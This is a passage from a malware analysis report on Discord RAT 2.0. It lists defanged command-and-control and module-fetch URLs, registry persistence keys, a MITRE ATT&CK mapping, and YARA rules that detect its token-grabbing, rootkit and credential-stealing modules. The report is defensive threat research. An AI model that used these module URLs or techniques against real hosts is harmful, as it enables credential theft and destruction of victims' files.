| Uninstall64.exe | `3f8e67521bbcdd48454f3443b0e4bd9699b334be7061efc3bbb84ffe88b04d36` |

### Network Indicators (defanged)

| Indicator | Purpose |
|-----------|---------|
| `wss://gateway[.]discord[.]gg/?v=9&encording=json` | C2 WebSocket gateway |
| `hxxps://discord[.]com/api/v9/channels/{id}/messages` | Command and exfil |
| `hxxps://discord[.]com/api/v9/users/@me` | Token validation (Token grabber module) |
| `hxxps://geolocation-db[.]com/json` | Victim IP geolocation |
| `hxxps://file[.]io/` | Overflow exfil for files >7.5 MB |
| `hxxps://raw[.]githubusercontent[.]com/moom825/Discord-RAT-2[.]0/master/Discord%20rat/Resources/PasswordStealer[.]dll` | Module fetch |
| `hxxps://raw[.]githubusercontent[.]com/moom825/Discord-RAT-2[.]0/master/Discord%20rat/Resources/rootkit[.]dll` | Module fetch |
| `hxxps://raw[.]githubusercontent[.]com/moom825/Discord-RAT-2[.]0/master/Discord%20rat/Resources/Webcam[.]dll` | Module fetch |
| `hxxps://raw[.]githubusercontent[.]com/moom825/Discord-RAT-2[.]0/master/Discord%20rat/Resources/Token%20grabber[.]dll` | Module fetch |

### Registry Keys

```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\$77Client-Built.exe
HKLM\SOFTWARE\$77config\pid
HKLM\SOFTWARE\$77config\paths
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr
```

### Discord C2 Config (burned in binary)

```
Bot Token : MTA4MDk4MTIyMDY1OTI5ODM1Nw[.]Ge9WdI[.][REDACTED_HMAC]
Guild ID  : 1080979971050319872
```

### Operator OPSEC Leak

```
Windows profile name: maxim
Working folder      : C:\Users\maxim\Desktop\project windows + android\rootkit\r77-rootkit-master\
```

### File Artifacts

```
<victim_file>.WANNACRY      Encrypted (destroyed) victim files, 1 byte of ciphertext each
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Registry Run Keys / Startup Folder | T1547.001 | Persistence |
| Scheduled Task | T1053.005 | Persistence |
| Bypass User Account Control | T1548.002 | Privilege Escalation |
| Disable or Modify Tools | T1562.001 | Defense Evasion |
| Disable or Modify System Firewall | T1562.004 | Defense Evasion |
| Reflective Code Loading | T1620 | Defense Evasion |
| Process Injection (RunPE into dllhost.exe) | T1055.012 | Defense Evasion |
| Parent PID Spoofing | T1134.004 | Defense Evasion |
| Screen Capture | T1113 | Collection |
| Clipboard Data | T1115 | Collection |
| Video Capture | T1125 | Collection |
| Steal Web Session Cookie | T1539 | Credential Access |
| Steal Application Access Token | T1528 | Credential Access |
| Credentials from Password Stores | T1555 | Credential Access |
| Credentials in Registry (Roblox cookie) | T1552.002 | Credential Access |
| Web Service (Discord) | T1102 | Command and Control |
| Application Layer Protocol: Web | T1071.001 | Command and Control |
| Exfiltration Over C2 Channel | T1041 | Exfiltration |
| Exfiltration Over Web Service | T1567 | Exfiltration |
| Windows Command Shell | T1059.003 | Execution |
| Native API | T1106 | Execution |
| Data Destruction | T1485 | Impact |
| Data Encrypted for Impact | T1486 | Impact |
| System Shutdown/Reboot | T1529 | Impact |
| Internal Defacement (wallpaper) | T1491.001 | Impact |

---

## YARA Rules

```text
import "pe"
import "dotnet"

rule DiscordRAT2_Generic {
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "Detects Discord RAT 2.0 (moom825), Discord-gateway C2 RAT written in C#"
        reference   = "https://github.com/moom825/Discord-RAT-2.0"
        hash        = "18c79efc9dea7a878ddf0071cd76313afa342855df5c709c6f18883599bc64b9"

    strings:
        $ws_url     = "wss://gateway.discord.gg/?v=9&encording=json" ascii wide
        $wannacry   = ".WANNACRY" ascii wide
        $ransom_key = "HAIROAHSJURNCBYE" ascii wide
        $reg_root   = "SOFTWARE\\$77config" ascii wide
        $gh_base    = "moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/" ascii wide
        $cmd_ransom = "!ransomware" ascii wide
        $cmd_blue   = "!bluescreen" ascii wide
        $cmd_roblox = "!robloxcookie" ascii wide
        $cmd_crit   = "!critproc" ascii wide
        $cmd_grab   = "!grabtokens" ascii wide
        $ns         = "Discord_rat" ascii wide

    condition:
        pe.is_pe and dotnet.is_dotnet
        and (
            ($ws_url and $wannacry)
            or ($ransom_key and $reg_root)
            or ($ns and $gh_base)
            or (5 of ($cmd_*))
        )
}

rule DiscordRAT2_Module_Rootkit_Stager {
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "Detects the .NET rootkit/unrootkit stager modules shipped with Discord RAT 2.0 that deploy r77-rootkit via process hollowing"
        reference   = "https://github.com/bytecode77/r77-rootkit"

    strings:
        $ns          = "InstallStager.Properties" ascii wide
        $dllhost32   = "C:\\Windows\\SysWOW64\\dllhost.exe" ascii wide
        $dllhost64   = "C:\\Windows\\System32\\dllhost.exe" ascii wide
        $procid_arg  = "/Processid:" ascii wide
        $winlogon    = "winlogon" ascii wide
        $unhook      = "UnhookDll" ascii wide
        $svc32       = "InstallService32" ascii wide
        $svc64       = "InstallService64" ascii wide
        $un32        = "Uninstall32" ascii wide
        $un64        = "Uninstall64" ascii wide

    condition:
        pe.is_pe and dotnet.is_dotnet
        and $ns and $unhook
        and ($dllhost32 or $dllhost64) and $procid_arg and $winlogon
        and (($svc32 and $svc64) or ($un32 and $un64))
}

rule DiscordRAT2_Module_r77_Payload {
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "Detects r77-rootkit payloads extracted from rootkit.dll / unrootkit.dll"

    strings:
        $pdb_release    = "r77-rootkit\\vs\\" ascii wide nocase
        $pdb_maxim      = "C:\\Users\\maxim\\Desktop\\project windows + android\\rootkit\\r77-rootkit-master" ascii wide nocase
        $r77_dll_x86    = "r77-x86.dll" ascii wide nocase
        $r77_dll_x64    = "r77-x64.dll" ascii wide nocase
        $r77_counter    = "r77ProcessCount" ascii wide

    condition:
        pe.is_pe
        and (
            $pdb_release or $pdb_maxim
            or $r77_dll_x86 or $r77_dll_x64
            or $r77_counter
        )
}

rule DiscordRAT2_Module_TokenGrabber {
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "Detects the Token grabber.dll module, a Discord token harvester targeting 22 browsers with AES-GCM decryption"

    strings:
        $ns         = "Token_grabber" ascii wide
        $api_me     = "https://discord.com/api/v9/users/@me" ascii wide
        $rx_std     = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}" ascii wide
        $rx_mfa     = "mfa\\.[\\w-]{84}" ascii wide
        $rick       = "dQw4w9WgXcQ:" ascii wide
        $b64_disc   = "XFJvYW1pbmdcZGlzY29yZA==" ascii wide
        $b64_app    = "XEFwcERhdGE=" ascii wide
        $b64_lvldb  = "XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYg==" ascii wide

    condition:
        pe.is_pe and dotnet.is_dotnet
        and $ns and ($api_me or $rick)
        and (($rx_std and $rx_mfa) or ($b64_disc and $b64_app and $b64_lvldb))
}

rule DiscordRAT2_Module_PasswordStealer_BlackNET {
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "Detects the BlackNET-derived PasswordStealer.dll module shipped by Discord RAT 2.0"

    strings:
        $cp          = "Black.Hacker - 2021" ascii wide
        $desc        = "BlackNET Password Stealer Plugin" ascii wide
        $company     = "DarkSoftwareCo" ascii wide
        $ns          = "PasswordStealer.ChromeRecovery" ascii wide
        $guid        = "983ae28c-91c3-4072-8cdf-698b2ff7a967" ascii wide nocase

    condition:
        pe.is_pe and dotnet.is_dotnet
        and (($cp and $desc) or ($ns and $company) or $guid)
}

rule DiscordRAT2_FakeRansomware {
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "Detects the broken ransomware module in Discord RAT 2.0"

    strings:
        $ext        = ".WANNACRY" ascii wide
        $key        = "HAIROAHSJURNCBYE" ascii wide
        $ns         = "Discord_rat" ascii wide
        $rpc        = "RansomPc" ascii wide

    condition:
        pe.is_pe and dotnet.is_dotnet
        and $ext and $key and ($ns or $rpc)
}
```

---

## Conclusion

Discord RAT 2.0 is a commodity crimeware tool released publicly on GitHub in August 2022 and still in heavy circulation in 2026. It has no single attributed operator: every sample carries a different Discord bot token and guild ID baked in, and each one maps to a separate operator setting up their own command infrastructure. For the sample analyzed here, snowflake decoding reveals an operator who stood up their Discord server and bot account within five minutes of each other on 2 March 2023, rotated the token in October 2024, and had their infrastructure taken down before the sample reached the feed. Both the token and the guild return dead responses from the Discord API. The telemetry window on this specific operator is closed, but the binary is still a perfect reference specimen for writing detections that will match the next operator's build.

The deepest finding comes from pulling the five modules off the public GitHub repo. `rootkit.dll` and `unrootkit.dll` are not moom825's code at all. They are the `InstallStager` project from [bytecode77's r77-rootkit](https://github.com/bytecode77/r77-rootkit), lifted wholesale and wrapped in an `Assembly.Load()` call. `PasswordStealer.dll` is the credential-theft plugin from the BlackNET malware-as-a-service family, with its author attribution (`Black.Hacker, 2021`) still embedded in the assembly metadata. The native Install payloads carry PDB paths showing they were built on bytecode77's own drive; the Uninstall payloads were rebuilt in debug mode by a separate operator `maxim` who left a Windows profile name and a "project windows + android" folder in every binary that calls the `!unrootkit` command.

The sample carries all the classic hallmarks of the family: 50 `!`-prefixed Discord commands, a five-module remote DLL loader pointing at `moom825/Discord-RAT-2.0` on GitHub, registry persistence keyed with the `$77` prefix, a UAC bypass via SilentCleanup, Defender/Firewall disablers, and the notorious "ransomware" module that is actually a wiper thanks to a `for (i = 0; i < 1; i++)` loop that encrypts exactly one byte per file before deleting the original. Files renamed to `.WANNACRY` cannot be recovered from the ciphertext, because the ciphertext is one byte long.

Detection is robust because the author's stylistic fingerprints are everywhere. The `encording=json` typo in the gateway URL is present in the upstream source and reproduced in every build. The hardcoded Rijndael key `HAIROAHSJURNCBYE` (which doubles as the IV), the `$77config` registry hive for the rootkit module, the `.WANNACRY` extension, the `dQw4w9WgXcQ:` Discord token prefix, and the `r77ProcessCount` string in the rootkit payloads together make the YARA rules above effectively zero-false-positive. Combined with the five-module GitHub URL base (`moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/`), any one of these strings on its own is a reliable family marker.

Defenders should treat this family less as a discrete threat and more as a delivery symptom: if a host beacons to `gateway.discord.gg` from a non-Discord-client process and a stub drops into `HKCU\...\Run` with a `$77` prefix, the bigger question is the dropper wrapper (cracked software, npm supply-chain poisoning, or a Discord social-engineering lure) that brought the stub in. The stub is easy to catch; the delivery chain is the interesting bit.
